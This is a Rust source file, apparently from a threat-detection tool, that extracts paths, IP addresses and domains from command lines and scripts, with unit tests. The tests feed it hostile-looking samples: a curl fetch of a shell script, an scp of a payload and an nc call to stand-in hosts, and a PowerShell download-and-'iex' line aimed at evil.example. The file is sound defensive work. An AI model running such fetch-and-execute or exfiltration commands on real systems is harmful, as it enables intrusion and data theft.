//! Observables carried inside text fields: command lines, scripts, registry
//! data, and WMI queries.
//!
//! A token is classified by shape alone. Nothing here can tell a file operand
//! from a subcommand, so a misread token becomes an observable no indicator
//! matches, never a change to a field another detector reads.

use super::path;
use super::{Observable, Observables};
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};

/// How a text field is read.
#[derive(Debug, Clone, Copy)]
pub(super) enum Text<'c> {
    /// A process command line. Operands that look like relative paths are
    /// resolved against `cwd`. The first token is the program: it is read, as
    /// an absolute path only, when the event reports no `Image` of its own.
    /// Otherwise `Image` already names it, and a second spelling such as
    /// `C:\WINDOWS\system32\cmd.exe` would raise a duplicate match.
    CommandLine {
        cwd: Option<&'c str>,
        has_image: bool,
    },
    /// Script, registry, or query text. Only absolute paths are kept, because
    /// the text has no working directory of its own.
    Prose,
    /// Like [`Text::Prose`], but yields network observables only. Used where
    /// the whole field is already reported as a path.
    Network,
}

pub(super) fn scan<'a>(text: &'a str, kind: Text<'_>, windows: bool, out: &mut Observables<'a>) {
    let argv = matches!(kind, Text::CommandLine { .. });
    let mut program = argv;
    for token in Tokens::new(text, argv, windows) {
        let reader = Reader {
            kind,
            windows,
            program,
        };
        reader.token(token, out);
        program = false;
    }
}

struct Reader<'c> {
    kind: Text<'c>,
    windows: bool,
    program: bool,
}

impl Reader<'_> {
    fn token<'a>(&self, token: &'a str, out: &mut Observables<'a>) {
        if self.program {
            // `bash` is not `/tmp/bash` because the shell ran in `/tmp`.
            let has_image = matches!(
                self.kind,
                Text::CommandLine {
                    has_image: true,
                    ..
                }
            );
            if !has_image && path::is_absolute(token, self.windows) {
                self.path(token, out);
            }
            return;
        }

        if token.starts_with(['-', '+']) || (self.windows && token.starts_with('/')) {
            // A flag carries an observable only as an attached value:
            // `--output=/tmp/x`, or `/out:C:\x` on Windows.
            let value = token
                .split_once('=')
                .or_else(|| self.windows.then(|| token.split_once(':')).flatten())
                .map(|(_, value)| value);
            if let Some(value) = value {
                self.operand(value, out);
            }
            return;
        }

        if is_symbolic_mode(token) {
            return;
        }

        if let Some((key, value)) = token.split_once('=') {
            if !key.is_empty() && !key.contains(['/', '\\']) {
                self.operand(value, out);
                return;
            }
        }

        self.operand(token, out);
    }

    fn operand<'a>(&self, token: &'a str, out: &mut Observables<'a>) {
        if token.is_empty() {
            return;
        }
        if let Some(host) = url_host(token) {
            push_host(host, out);
            return;
        }
        if let Some(ip) = parse_ip(token) {
            out.push(Observable::Ip(ip));
            return;
        }
        if path::is_absolute(token, self.windows) {
            self.path(token, out);
            return;
        }
        if let Some((user, host)) = token.rsplit_once('@') {
            // `root@203.0.113.7`, or `git@host:org/repo.git` where only the
            // text after `:` is a path.
            if !user.is_empty() && !user.contains(['/', '\\']) {
                push_host(host.split(':').next().unwrap_or(host), out);
                return;
            }
        }

        if token.contains('.') {
            let host = strip_port(token.trim_end_matches('.'));
            if is_hostname(host) {
                out.push(Observable::Domain(host));
            }
        }

        if let Text::CommandLine { cwd, .. } = self.kind {
            if is_relative_path(token) {
                if let Some(resolved) = path::resolve(token, cwd, self.windows) {
                    out.push(Observable::Path(resolved));
                }
            }
        }
    }

    fn path<'a>(&self, token: &'a str, out: &mut Observables<'a>) {
        if matches!(self.kind, Text::Network) {
            return;
        }
        if let Some(resolved) = path::resolve(token, None, self.windows) {
            out.push(Observable::Path(resolved));
        }
    }
}

/// Splits text into candidate tokens without allocating.
///
/// A command line splits on whitespace, and a double-quoted span is one
/// argument. Prose also splits on shell and script punctuation, and a quoted
/// span is kept whole only when it is an absolute path or a URL, so that
/// `"C:\Program Files\x.exe"` survives while a quoted sentence is split.
struct Tokens<'a> {
    text: &'a str,
    pos: usize,
    argv: bool,
    windows: bool,
}

impl<'a> Tokens<'a> {
    fn new(text: &'a str, argv: bool, windows: bool) -> Self {
        Self {
            text,
            pos: 0,
            argv,
            windows,
        }
    }

    fn is_quote(&self, c: char) -> bool {
        c == '"' || (!self.argv && matches!(c, '\'' | '`'))
    }

    fn is_delimiter(&self, c: char) -> bool {
        c.is_whitespace()
            || (!self.argv
                && matches!(
                    c,
                    '(' | ')' | '[' | ']' | '{' | '}' | '<' | '>' | ',' | ';' | '|' | '&'
                ))
    }

    fn keeps_whole(&self, inner: &str) -> bool {
        self.argv || path::is_absolute(inner, self.windows) || url_host(inner).is_some()
    }
}

impl<'a> Iterator for Tokens<'a> {
    type Item = &'a str;

    fn next(&mut self) -> Option<&'a str> {
        loop {
            let rest = &self.text[self.pos..];
            let (offset, c) = rest.char_indices().find(|&(_, c)| !self.is_delimiter(c))?;
            let start = self.pos + offset;

            if self.is_quote(c) {
                let body = start + c.len_utf8();
                if let Some(close) = self.text[body..].find(c) {
                    let inner = &self.text[body..body + close];
                    if self.keeps_whole(inner) {
                        self.pos = body + close + c.len_utf8();
                        if inner.is_empty() {
                            continue;
                        }
                        return Some(inner);
                    }
                }
                // An unmatched quote, or a quoted span that is not one value,
                // is only a separator.
                self.pos = body;
                continue;
            }

            let len = self.text[start..]
                .char_indices()
                .find(|&(_, c)| self.is_delimiter(c) || self.is_quote(c))
                .map_or(self.text.len() - start, |(index, _)| index);
            self.pos = start + len;
            return Some(&self.text[start..start + len]);
        }
    }
}

fn push_host<'a>(host: &'a str, out: &mut Observables<'a>) {
    if let Some(ip) = is_ip_shaped(host)
        .then(|| host.parse::<IpAddr>().ok())
        .flatten()
    {
        out.push(Observable::Ip(ip));
        return;
    }
    let host = host.trim_end_matches('.');
    if !host.is_empty()
        && host
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b'.'))
    {
        out.push(Observable::Domain(host));
    }
}

/// The host of `scheme://[user@]host[:port][/...]`.
fn url_host(token: &str) -> Option<&str> {
    // The scheme ends at the first `:`, so a byte search finds it without a
    // substring search on every token.
    let colon = token.find(':')?;
    let (scheme, rest) = (&token[..colon], token[colon + 1..].strip_prefix("//")?);
    let mut bytes = scheme.bytes();
    if !bytes.next()?.is_ascii_alphabetic()
        || !bytes.all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'-' | b'.'))
    {
        return None;
    }
    let authority = &rest[..rest.find(['/', '\\', '?', '#']).unwrap_or(rest.len())];
    let host_port = authority
        .rsplit_once('@')
        .map_or(authority, |(_, host)| host);
    let host = match host_port.strip_prefix('[') {
        Some(bracketed) => &bracketed[..bracketed.find(']')?],
        None => host_port.split(':').next().unwrap_or(host_port),
    };
    (!host.is_empty()).then_some(host)
}

/// An IP address, optionally with a port: `203.0.113.7:443`, `[2001:db8::1]:443`.
fn parse_ip(token: &str) -> Option<IpAddr> {
    if !is_ip_shaped(token) {
        return None;
    }
    if let Ok(ip) = token.parse::<IpAddr>() {
        return Some(ip);
    }
    if let Some(bracketed) = token.strip_prefix('[') {
        let (inner, tail) = bracketed.split_once(']')?;
        if !tail.is_empty() && !tail.strip_prefix(':').is_some_and(is_port) {
            return None;
        }
        return inner.parse::<Ipv6Addr>().ok().map(IpAddr::V6);
    }
    let (host, port) = token.rsplit_once(':')?;
    if !is_port(port) {
        return None;
    }
    host.parse::<Ipv4Addr>().ok().map(IpAddr::V4)
}

/// Whether `token` could be an address, optionally bracketed or with a port,
/// so that ordinary words skip the comparatively slow address parsers.
fn is_ip_shaped(token: &str) -> bool {
    let mut separator = false;
    token.bytes().all(|b| {
        separator |= matches!(b, b'.' | b':');
        b.is_ascii_hexdigit() || matches!(b, b'.' | b':' | b'[' | b']')
    }) && separator
}

fn strip_port(token: &str) -> &str {
    match token.rsplit_once(':') {
        Some((host, port)) if is_port(port) || port.is_empty() => host,
        _ => token,
    }
}

fn is_port(value: &str) -> bool {
    !value.is_empty() && value.len() <= 5 && value.bytes().all(|b| b.is_ascii_digit())
}

/// A DNS name with at least two labels and an alphabetic top-level label, so
/// that version strings and addresses are not read as hosts.
fn is_hostname(value: &str) -> bool {
    if value.len() > 253 {
        return false;
    }
    let mut labels = 0;
    let mut last = "";
    for label in value.split('.') {
        if label.is_empty()
            || label.len() > 63
            || label.starts_with('-')
            || label.ends_with('-')
            || !label
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_'))
        {
            return false;
        }
        labels += 1;
        last = label;
    }
    labels >= 2
        && (last.starts_with("xn--")
            || (last.len() >= 2 && last.bytes().all(|b| b.is_ascii_alphabetic())))
}

/// An operand that can name a file relative to the working directory.
///
/// Globs, variables, shell operators, `host:port` and `user:group` forms, and
/// bare numbers are not: the shell or the program gives those another meaning,
/// and resolving them would invent a path nobody named.
fn is_relative_path(token: &str) -> bool {
    !token.is_empty()
        && !token.starts_with('~')
        && !token.bytes().all(|b| b.is_ascii_digit())
        && !token.bytes().any(|b| {
            b.is_ascii_control()
                || matches!(
                    b,
                    b'*' | b'?'
                        | b'['
                        | b']'
                        | b'{'
                        | b'}'
                        | b'$'
                        | b'%'
                        | b':'
                        | b'@'
                        | b'<'
                        | b'>'
                        | b'|'
                        | b'&'
                        | b';'
                        | b'('
                        | b')'
                        | b'`'
                        | b'"'
                        | b'\''
                        | b'='
                )
        })
}

/// A `chmod` symbolic mode such as `u+x`, `go-w`, or `a=r,u+s`.
fn is_symbolic_mode(token: &str) -> bool {
    token.starts_with(['u', 'g', 'o', 'a'])
        && token.bytes().any(|b| matches!(b, b'+' | b'-' | b'='))
        && token.bytes().all(|b| {
            matches!(
                b,
                b'u' | b'g'
                    | b'o'
                    | b'a'
                    | b'+'
                    | b'-'
                    | b'='
                    | b'r'
                    | b'w'
                    | b'x'
                    | b'X'
                    | b's'
                    | b't'
                    | b','
            )
        })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn observables(text: &str, kind: Text<'_>, windows: bool) -> Vec<String> {
        let mut out = Observables::new();
        scan(text, kind, windows, &mut out);
        out.iter().map(ToString::to_string).collect()
    }

    fn linux_command(text: &str, cwd: &str) -> Vec<String> {
        observables(
            text,
            Text::CommandLine {
                cwd: Some(cwd),
                has_image: false,
            },
            false,
        )
    }

    #[test]
    fn relative_and_absolute_operands_resolve_to_the_same_path() {
        assert_eq!(
            linux_command("chmod +x /tmp/malware", "/tmp"),
            ["path:/tmp/malware"]
        );
        assert_eq!(
            linux_command("chmod +x malware", "/tmp"),
            ["path:/tmp/malware"]
        );
        assert_eq!(
            linux_command("chmod u+x ./malware", "/tmp"),
            ["path:/tmp/malware"]
        );
        assert_eq!(
            linux_command("chmod 755 ../tmp/malware", "/var"),
            ["path:/tmp/malware"]
        );
    }

    #[test]
    fn the_program_is_not_resolved_against_the_working_directory() {
        assert!(linux_command("bash", "/tmp").is_empty());
        assert_eq!(
            linux_command("/usr/bin/bash", "/tmp"),
            ["path:/usr/bin/bash"]
        );
    }

    #[test]
    fn the_program_is_left_to_image_when_the_event_has_one() {
        // `Image` is `C:\Windows\System32\cmd.exe`; reading the differently
        // cased program token too would match one path regex twice.
        let command_line = Text::CommandLine {
            cwd: Some(r"C:\Users\Public"),
            has_image: true,
        };
        assert!(observables(r#""C:\WINDOWS\system32\cmd.exe" /c"#, command_line, true).is_empty());
    }

    #[test]
    fn flags_globs_and_non_path_operands_yield_nothing() {
        for command in [
            "ls -la --color",
            "chmod 0755",
            "chmod go-w,u+x",
            "rm *.log",
            "cat file?.txt",
            "echo $HOME ~/x %TEMP%",
            "sh > | && 2>&1",
            "chown root:root",
            "sleep 30",
        ] {
            assert!(
                linux_command(command, "/tmp").is_empty(),
                "{command}: {:?}",
                linux_command(command, "/tmp")
            );
        }
    }

    #[test]
    fn flag_values_are_operands() {
        assert_eq!(
            linux_command("tool --output=payload -x", "/tmp"),
            ["path:/tmp/payload"]
        );
        assert_eq!(
            observables(
                r"robocopy.exe /log:C:\Temp\copy.log /mt",
                Text::CommandLine {
                    cwd: Some(r"C:\Users"),
                    has_image: true,
                },
                true
            ),
            [r"path:C:\Temp\copy.log"]
        );
    }

    #[test]
    fn network_operands_become_hosts() {
        assert_eq!(
            linux_command("curl -fsSL https://User@Evil.Example:8443/x.sh", "/"),
            ["domain:Evil.Example"]
        );
        assert_eq!(
            linux_command("ssh root@203.0.113.7", "/"),
            ["ip:203.0.113.7"]
        );
        assert_eq!(
            linux_command("scp payload deploy@evil.example:/srv/drop/", "/tmp"),
            ["path:/tmp/payload", "domain:evil.example"]
        );
        assert_eq!(
            linux_command("nc 203.0.113.7:4444", "/"),
            ["ip:203.0.113.7"]
        );
        assert_eq!(
            linux_command("wget http://[2001:db8::1]:80/", "/"),
            ["ip:2001:db8::1"]
        );
    }

    #[test]
    fn bare_host_operands_are_both_hosts_and_relative_paths() {
        // Shape alone cannot tell `evil.example` the host from a file of that
        // name, so both are offered and neither matches an unrelated indicator.
        assert_eq!(
            linux_command("ping evil.example", "/tmp"),
            ["domain:evil.example", "path:/tmp/evil.example"]
        );
        assert_eq!(linux_command("tar 1.2.3", "/tmp"), ["path:/tmp/1.2.3"]);
    }

    #[test]
    fn quoted_windows_arguments_are_one_operand() {
        assert_eq!(
            observables(
                r#""C:\Program Files\App\app.exe" "sub dir\payload.exe""#,
                Text::CommandLine {
                    cwd: Some(r"C:\Users\Public"),
                    has_image: false,
                },
                true
            ),
            [
                r"path:C:\Program Files\App\app.exe",
                r"path:C:\Users\Public\sub dir\payload.exe"
            ]
        );
    }

    #[test]
    fn relative_operands_need_a_working_directory() {
        let command_line = Text::CommandLine {
            cwd: None,
            has_image: true,
        };
        assert!(observables("chmod +x malware", command_line, false).is_empty());
    }

    #[test]
    fn prose_yields_urls_addresses_and_absolute_paths() {
        let script = r#"$c = (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1');
            Start-Process "C:\Program Files\Evil\run.exe"; iex $c; ping 203.0.113.9"#;
        assert_eq!(
            observables(script, Text::Prose, true),
            [
                "domain:Net.WebClient",
                "domain:evil.example",
                r"path:C:\Program Files\Evil\run.exe",
                "ip:203.0.113.9",
            ]
        );
    }

    #[test]
    fn prose_never_resolves_relative_paths() {
        assert!(observables("payload.bin ./run", Text::Prose, false)
            .iter()
            .all(|observable| !observable.starts_with("path:")));
    }

    #[test]
    fn quoted_sentences_in_prose_are_split() {
        assert_eq!(
            observables(
                r#"Write-Host "beacon to evil.example now""#,
                Text::Prose,
                true
            ),
            ["domain:evil.example"]
        );
    }

    #[test]
    fn network_text_skips_paths() {
        assert_eq!(
            observables(
                r"C:\Windows\svc.exe -server http://evil.example/ 203.0.113.9",
                Text::Network,
                true
            ),
            ["domain:evil.example", "ip:203.0.113.9"]
        );
    }

    #[test]
    fn dns_answer_lists_split_on_every_separator() {
        assert_eq!(
            observables(
                " ,;\t203.0.113.1;invalid,\n::ffff:198.51.100.2\u{2003}cname.example;; ",
                Text::Network,
                true
            ),
            [
                "ip:203.0.113.1",
                "ip:::ffff:198.51.100.2",
                "domain:cname.example"
            ]
        );
    }

    #[test]
    fn unterminated_quotes_do_not_swallow_the_rest() {
        assert_eq!(
            observables(r#"it's at "http://evil.example"#, Text::Prose, false),
            ["domain:evil.example"]
        );
    }
}
